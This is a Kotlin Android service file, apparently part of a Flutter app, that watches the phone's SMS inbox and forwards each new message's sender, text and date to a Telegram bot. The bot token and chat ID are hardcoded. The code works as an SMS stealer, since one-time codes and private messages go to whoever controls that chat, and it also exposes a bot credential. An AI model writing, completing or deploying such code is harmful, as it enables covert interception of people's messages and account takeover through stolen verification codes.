package com.example.smsapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import io.flutter.plugin.common.MethodChannel
import io.flutter.embedding.android.FlutterActivity
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class SmsService : Service() {

    private val CHANNEL_ID = "sms_service_channel"
    private val CHANNEL_NAME = "SMS Service"
    private lateinit var smsChannel: MethodChannel

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        startSmsObserver() // SMS monitoringni boshlash
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotification(): Notification {
        val notificationBuilder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SMS Service")
            .setContentText("Running in the foreground to listen for SMS")
            .setSmallIcon(R.drawable.ic_sms)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)

        return notificationBuilder.build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = CHANNEL_NAME
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(CHANNEL_ID, name, importance)
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startSmsObserver() {
        val smsUri: Uri = Uri.parse("content://sms")
        contentResolver.registerContentObserver(
            smsUri,
            true,
            object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    val newSmsList = getAllSms()
                    smsChannel.invokeMethod("onNewSms", newSmsList) // SMSlarni Flutterga yuborish
                }
            })
    }

    private fun getAllSms(): List<Map<String, String>> {
        val smsList = mutableListOf<Map<String, String>>()
        val uri: Uri = Uri.parse("content://sms/inbox")
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)

        cursor?.use {
            val previousSmsIds = getSmsIdsFromPreferences().toMutableSet()

            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow("address")) ?: "No Address"
                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: "No Body"
                val dateMillis = it.getLong(it.getColumnIndexOrThrow("date"))
                val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(dateMillis))
                val smsId = it.getString(it.getColumnIndexOrThrow("_id")) ?: ""

                if (smsId !in previousSmsIds) {
                    smsList.add(mapOf("address" to address, "body" to body, "date" to date))
                    previousSmsIds.add(smsId)
                    sendSmsToTelegram(address, body, date)
                    saveSmsIdsToPreferences(previousSmsIds)
                }
            }
        }
        return smsList
    }

    private fun sendSmsToTelegram(address: String, body: String, date: String) {
        val botToken = "7223835990:AAHF6uuOmQeSG2UMeY28_kAtnNCktr3sNvc" // Replace with your bot token
        val chatId = "7321341340"
        val message = """
            📱 Devit new sms
            ✉️ From: $address.
            📝 Message: $body.
            📅 Date: $date.
        """.trimIndent()

        val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
        val params = "chat_id=$chatId&text=$message"

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.outputStream.write(params.toByteArray(Charsets.UTF_8))
                connection.responseCode // So'rovni amalga oshirish
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun saveSmsIdsToPreferences(ids: Set<String>) {
        val sharedPrefs = getSharedPreferences("smsPrefs", MODE_PRIVATE)
        val editor = sharedPrefs.edit()
        editor.putStringSet("smsIds", ids)
        editor.apply()
    }

    private fun getSmsIdsFromPreferences(): Set<String> {
        val sharedPrefs = getSharedPreferences("smsPrefs", MODE_PRIVATE)
        return sharedPrefs.getStringSet("smsIds", mutableSetOf()) ?: mutableSetOf()
    }
}
